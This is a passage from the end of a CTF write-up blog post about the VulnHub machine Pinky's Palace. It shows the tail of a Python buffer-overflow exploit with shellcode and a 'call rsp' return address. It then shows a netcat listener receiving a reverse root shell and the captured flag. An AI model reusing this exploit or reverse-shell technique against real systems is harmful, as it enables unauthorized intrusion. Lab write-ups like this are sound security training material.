<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x83\xbf\x7e\x96\x49\x0a\x28\xdb\xbe\xb6\xda\xc7\x30</span><span class="s">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xcb\x6f\x65\xe4\x22\xd9\x92\x47\x21\x4f\xde\x98\x08</span><span class="s">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x39\x1b\x3a\x05\x6f\x57\x2d\x4f\xb5\xfc\x68\x52\x27</span><span class="s">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xde\xcb</span><span class="s">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xfb\x0c\x40</span><span class="s">"</span> <span class="c1">#0x400cfb  call rsp
</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'latin'</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Done"</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Error"</span><span class="p">)</span>
</code></pre></div></div>

<p>We set up a netcat listener in our case on port 443, and run the exploit.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 exploit.py
Done
</code></pre></div></div>

<p>We have a root shell, and we can read de root flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.178] 34066
script <span class="nt">-qc</span> /bin/bash /dev/null
root@Pinkys-Palace:/daemon# <span class="nb">cd</span> /root
<span class="nb">cd</span> /root
root@Pinkys-Palace:/root# <span class="nb">ls
ls
</span>root.txt
root@Pinkys-Palace:/root# <span class="nb">cat </span>root.txt
<span class="nb">cat </span>root.txt

 ____  _       _          _     
|  _ <span class="se">\(</span>_<span class="o">)</span>_ __ | | ___   _<span class="o">(</span> <span class="o">)</span>___ 
| |_<span class="o">)</span> | | <span class="s1">'_ \| |/ / | | |// __|
|  __/| | | | |   &lt;| |_| | \__ \
|_|   |_|_| |_|_|\_\\__, | |___/
                    |___/       
 ____       _                   
|  _ \ __ _| | __ _  ___ ___ 
| |_) / _` | |/ _` |/ __/ _ \
|  __/ (_| | | (_| | (_|  __/
|_|   \__,_|_|\__,_|\___\___|

[+] CONGRATS YOUVE PWND PINKYS PALACE!!!!!!   
[+] Flag: 2208f787fcc6433b4798d2189af7424d
[+] Twitter: @Pink_P4nther
[+] Cheers to VulnHub!
[+] VM Host: VMware
[+] Type: CTF || [Realistic]
[+] Hopefully you enjoyed this and gained something from it as well!!!
root@Pinkys-Palace:/root#
</span></code></pre></div></div>













  <footer>
<!--	  <div class="dashed"></div> -->
    <ul class="horizontal-list">
  
</ul>

  </footer>


        
          <button title="Toggle Theme" class="theme-toggle">
  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
    <path d="
             M 16 0
             A 16 16 0 0 0 16 32
             z">
    </path>
  </svg>
</button>

        
        <div class="credits">&copy;&nbsp;2022&nbsp;s4rgaz
          &nbsp;
		  •
          &nbsp;<!--Powered by <a href="https://www.soopr.co" target="_blank" rel="noreferrer">Soopr</a>
          &nbsp;
		  •
          &nbsp;-->
		  <!--Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>-->
		  RSS&nbsp; <a href="/feed.xml" target="_blank" rel="noreferrer">Feed</a>
        </div>
      </div>
    </main><script async defer src="https://sdk.soopr.co/soopr.js"></script></body>
</html>
